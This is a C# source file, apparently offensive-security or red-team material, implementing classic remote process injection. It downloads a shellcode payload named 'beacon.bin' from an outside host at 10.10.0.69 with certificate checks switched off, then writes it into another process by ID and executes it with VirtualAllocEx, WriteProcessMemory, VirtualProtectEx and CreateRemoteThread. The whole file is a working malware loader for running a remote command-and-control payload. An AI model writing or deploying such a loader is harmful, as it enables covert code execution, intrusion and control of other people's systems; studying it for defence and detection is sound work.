using System;
using System.Diagnostics;
using System.Net.Http;
using System.Threading.Tasks;

namespace CreateRemoteThread
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    shellcode = await client.GetByteArrayAsync("https://10.10.0.69/beacon.bin");
                }
            }

            // Open handle to process
            var process = Process.GetProcessById(8712);

            // Allocate a region of memory
            var baseAddress = Win32.VirtualAllocEx(
                process.Handle,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            // Write shellcode into region
            Win32.WriteProcessMemory(
                process.Handle,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            // Flip memory region to RX
            Win32.VirtualProtectEx(
                process.Handle,
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            // Create the new thread
            Win32.CreateRemoteThread(
                process.Handle,
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out _);

            // Shellcode is runing in a remote process
            // no need to stop this process from closing
        }
    }
}